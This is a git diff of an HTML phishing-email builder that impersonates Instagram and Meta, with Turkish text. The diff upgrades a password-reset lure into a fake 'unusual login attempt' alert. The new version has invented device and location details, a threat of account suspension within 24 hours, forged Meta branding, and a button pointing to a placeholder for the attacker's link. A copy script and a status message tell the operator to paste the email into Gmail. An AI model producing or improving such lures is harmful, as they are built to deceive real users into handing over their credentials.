@@ -1,51 +1,63 @@
 <!DOCTYPE html>
-<html lang="az">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mail Kopyala</title>
+    <title>Güvenlik Uyarısı</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #fafafa; }
-        .btn-copy {
-            padding: 20px 40px; background: #0095f6; color: white;
-            border: none; border-radius: 30px; font-size: 18px; font-weight: bold;
-            cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-        #mail-template { display: none; } /* Mail gizli qalır, sadəcə kopyalamaq üçündür */
+        body { font-family: sans-serif; text-align: center; padding: 20px; background: #fafafa; }
+        .copy-area { padding: 15px; background: #0095f6; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
+        #mail-content { background: #ffffff; border: 1px solid #dbdbdb; max-width: 450px; margin: auto; padding: 0; text-align: left; border-radius: 4px; }
     </style>
 </head>
 <body>
 
-    <button class="btn-copy" onclick="copyMail()">Maili Kopyala</button>
-    <p id="status"></p>
+    <button class="copy-area" onclick="copyFullMail()">E-postayı Kopyala</button>
+    <p id="msg"></p>
 
     <div id="mail-content">
-        <div style="font-family: -apple-system, system-ui, sans-serif; background: #fff; border: 1px solid #dbdbdb; padding: 40px; text-align: center; max-width: 450px; margin: auto;">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="100" style="margin-bottom: 30px;">
-            <div style="text-align: left; color: #262626; font-size: 16px; line-height: 24px; margin-bottom: 30px;">
-                Üzgünüz, kullanici, şifreni sıfırlamakta sorun yaşadığını duyduk.<br><br>
-                Hesabına tekrar erişebilmek için aşağıdaki düğmeyi kullanabilirsin.
-            </div>
-            <a href="SENIN_GITHUB_LINKIN" style="display: inline-block; background: #0095f6; color: #ffffff !important; padding: 12px 24px; border-radius: 8px; text-decoration: none; font-weight: 600; margin-bottom: 30px;">Şifreni Sıfırla</a>
-            <div style="text-align: left; color: #8e8e8e; font-size: 14px;">
-                Eğer bu isteği sen yapmadıysan, bu e-postayı görmezden gelebilirsin.
-            </div>
-            <hr style="border: 0; border-top: 1px solid #dbdbdb; margin: 20px 0;">
-            <div style="color: #8e8e8e; font-size: 12px;">© Instagram. Meta Platforms, Inc.</div>
+        <div style="padding: 20px; text-align: center;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" width="80">
+        </div>
+        
+        <div style="padding: 20px; color: #262626; font-size: 16px; line-height: 1.5;">
+            Hi, <br><br>
+            Hesabına olağandışı bir giriş denemesi tespit ettik. Hesabının güvenliğini korumak için şu anki şifreni değiştirmen gerekiyor. 
+            <br><br>
+            <b>Cihaz:</b> iPhone 15 Pro<br>
+            <b>Konum:</b> Amsterdam, NL (Yakınlarında değilse hemen işlem yap)<br><br>
+            Eğer bu giriş denemesini sen yapmadıysan, hesabını güvene almak için aşağıdaki düğmeyi kullan:
+        </div>
+
+        <div style="text-align: center; padding: 10px 20px;">
+            <a href="SENIN_GITHUB_LINKIN" style="display: block; background-color: #0095f6; color: #ffffff !important; padding: 14px; text-decoration: none; border-radius: 8px; font-weight: 700; font-size: 14px;">Şifremi Güvene Al</a>
+        </div>
+
+        <div style="padding: 20px; color: #8e8e8e; font-size: 13px; line-height: 1.4;">
+            Bu işlemi sen yapmadıysan, şifren bir başkasının eline geçmiş olabilir. Instagram topluluk kuralları gereği hesabın 24 saat içinde geçici olarak askıya alınabilir.
+            <br><br>
+            Yardım Merkezini ziyaret ederek daha fazla bilgi alabilirsin.
+        </div>
+
+        <div style="padding: 20px; background: #fafafa; border-top: 1px solid #dbdbdb; color: #999; font-size: 11px; text-align: center;">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Meta-Logo.png" width="60" style="margin-bottom: 10px;"><br>
+            © Instagram. Meta Platforms, Inc. <br>
+            1601 Willow Road, Menlo Park, CA 94025<br><br>
+            This message was sent to you as a security alert. <br>
+            <b>Meta Verified Security System</b>
         </div>
     </div>
 
     <script>
-        function copyMail() {
+        function copyFullMail() {
             const range = document.createRange();
             range.selectNode(document.getElementById("mail-content"));
             window.getSelection().removeAllRanges();
             window.getSelection().addRange(range);
             document.execCommand("copy");
             window.getSelection().removeAllRanges();
-            
-            document.getElementById("status").innerText = "Kopyalandı! İndi Gmail-ə girib yapışdır.";
-            document.getElementById("status").style.color = "green";
+            document.getElementById("msg").innerText = "Başarıyla kopyalandı! Şimdi Gmail'e yapıştır.";
+            document.getElementById("msg").style.color = "blue";
         }
     </script>
 
